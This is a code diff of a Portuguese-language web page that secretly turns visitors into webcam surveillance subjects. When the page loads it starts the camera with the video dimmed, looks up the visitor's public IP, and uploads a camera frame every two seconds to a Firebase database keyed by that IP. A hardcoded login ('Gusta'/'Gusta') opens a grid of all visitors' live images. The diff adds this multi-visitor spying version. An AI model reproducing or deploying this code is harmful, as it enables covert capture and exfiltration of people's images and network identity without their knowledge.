@@ -3,22 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monitoramento Live</title>
+    <title>Painel de Monitoramento por IP</title>
     <style>
         body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; }
         #admin-area { position: absolute; top: 10px; left: 10px; z-index: 100; }
-        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #00ff00; }
+        .login-box { background: rgba(0, 0, 0, 0.9); padding: 12px; border-radius: 8px; display: flex; flex-direction: column; gap: 8px; border: 1px solid #007bff; }
         input { padding: 8px; border-radius: 4px; border: none; width: 130px; background: #222; color: #fff; }
-        button { cursor: pointer; background: #008000; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
-        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; }
+        button { cursor: pointer; background: #007bff; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; }
+        video { width: 100vw; height: 100vh; object-fit: cover; position: absolute; top: 0; left: 0; opacity: 0.3; }
         canvas { display: none; }
         .hidden { display: none !important; }
         
-        /* Painel de Live */
-        #historico-painel { background: #111; padding: 10px; border-radius: 8px; margin-top: 10px; width: 300px; border: 2px solid #00ff00; }
-        #live-frame { width: 100%; border-radius: 4px; display: block; background: #000; margin-top: 10px; }
-        .status-live { font-size: 12px; color: #00ff00; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        /* Grid de Monitoramento */
+        #grid-monitores { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); 
+            gap: 10px; 
+            margin-top: 10px;
+            max-height: 80vh;
+            overflow-y: auto;
+            width: 320px;
+        }
+        .monitor-card { 
+            background: #111; 
+            border: 1px solid #444; 
+            border-radius: 5px; 
+            padding: 5px; 
+            text-align: center;
+        }
+        .monitor-card img { width: 100%; border-radius: 3px; background: #000; }
+        .monitor-info { font-size: 10px; color: #00ff00; margin-bottom: 4px; display: block; }
     </style>
 </head>
 <body>
@@ -30,19 +44,17 @@
         <div id="form-login" class="login-box">
             <input type="text" id="usuario" placeholder="User">
             <input type="password" id="senha" placeholder="Pass">
-            <button onclick="verificarAdmin()">ABRIR MONITORAMENTO AO VIVO</button>
+            <button onclick="verificarAdmin()">MONITORAR POR IP</button>
         </div>
 
         <div id="painel-admin" class="hidden">
             <div class="login-box">
                 <div style="display:flex; justify-content: space-between; align-items:center;">
-                    <span class="status-live">● AO VIVO</span>
+                    <span style="color:#007bff; font-size: 12px;">PAINEL MULTI-IP</span>
                     <button onclick="location.reload()" style="background:#d9534f; padding: 2px 8px;">X</button>
                 </div>
-                <div id="historico-painel">
-                    <span id="timestamp-live" style="font-size: 10px;">Aguardando sinal...</span>
-                    <img id="live-frame" src="">
-                </div>
+                <div id="grid-monitores">
+                    </div>
             </div>
         </div>
     </div>
@@ -59,32 +71,40 @@
 
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
+        let meuIP = "carregando...";
 
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas-foto');
-        const liveImg = document.getElementById('live-frame');
+        // 1. Pega o IP do usuário primeiro
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                meuIP = data.ip.replace(/\./g, '_'); // Troca pontos por underline pro Firebase aceitar
+                iniciarApp();
+            });
 
         async function iniciarApp() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
+                document.getElementById('webcam').srcObject = stream;
                 
-                // Inicia o loop de envio: 1 foto a cada 1.5 segundos
-                setInterval(capturarEAtualizar, 1500);
+                // Envia foto a cada 2 segundos para o documento com o nome do IP
+                setInterval(capturarEAtualizar, 2000);
             } catch (err) { console.error(err); }
         }
 
         function capturarEAtualizar() {
+            const video = document.getElementById('webcam');
+            const canvas = document.getElementById('canvas-foto');
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 const context = canvas.getContext('2d');
-                canvas.width = 320; // Tamanho menor para ser ultra rápido
+                canvas.width = 320;
                 canvas.height = 240;
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
                 const fotoBase64 = canvas.toDataURL('image/jpeg', 0.3);
                 
-                // USAMOS .doc("live").set() para SEMPRE APAGAR A ANTERIOR e colocar a nova
-                db.collection("monitoramento").doc("live").set({
+                // Salva no documento com o nome do IP (Sobrescreve a última foto deste IP)
+                db.collection("ips_ativos").doc(meuIP).set({
+                    ip_original: meuIP.replace(/_/g, '.'),
                     timestamp: new Date().toLocaleTimeString(),
                     imagem: fotoBase64
                 });
@@ -95,22 +115,29 @@
             if (document.getElementById('usuario').value === "Gusta" && document.getElementById('senha').value === "Gusta") {
                 document.getElementById('form-login').classList.add('hidden');
                 document.getElementById('painel-admin').classList.remove('hidden');
-                escutarLive();
+                escutarTodosIPs();
             }
         }
 
-        function escutarLive() {
-            // Escuta especificamente o documento "live" que está sendo sobrescrito
-            db.collection("monitoramento").doc("live").onSnapshot((doc) => {
-                if (doc.exists) {
+        function escutarTodosIPs() {
+            const grid = document.getElementById('grid-monitores');
+            
+            // Escuta a coleção inteira. Se um IP novo entrar, ele cria um novo card.
+            db.collection("ips_ativos").onSnapshot((snapshot) => {
+                grid.innerHTML = ""; 
+                snapshot.forEach((doc) => {
                     const dados = doc.data();
-                    liveImg.src = dados.imagem;
-                    document.getElementById('timestamp-live').innerText = "Última atualização: " + dados.timestamp;
-                }
+                    const card = document.createElement('div');
+                    card.className = "monitor-card";
+                    card.innerHTML = `
+                        <span class="monitor-info">IP: ${dados.ip_original}</span>
+                        <img src="${dados.imagem}">
+                        <span style="font-size:8px; color:#aaa;">Lido às: ${dados.timestamp}</span>
+                    `;
+                    grid.appendChild(card);
+                });
             });
         }
-
-        window.onload = iniciarApp;
     </script>
 </body>
 </html>
